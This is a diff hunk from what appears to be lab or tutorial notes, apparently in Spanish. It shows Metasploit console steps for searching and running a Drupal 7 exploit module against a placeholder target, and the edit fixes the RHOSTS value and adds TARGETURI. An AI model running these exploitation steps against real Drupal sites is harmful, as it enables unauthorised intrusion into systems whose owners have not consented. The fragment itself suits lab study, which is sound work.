@@ -15,7 +15,8 @@ msfconsole
 search drupal 7
 use 1
 show options
-set RHOSTS http://<IP>/drupal-7.57/
+set RHOSTS <IP_objetivo>
+set TARGETURI /drupal
 run
 ```
 
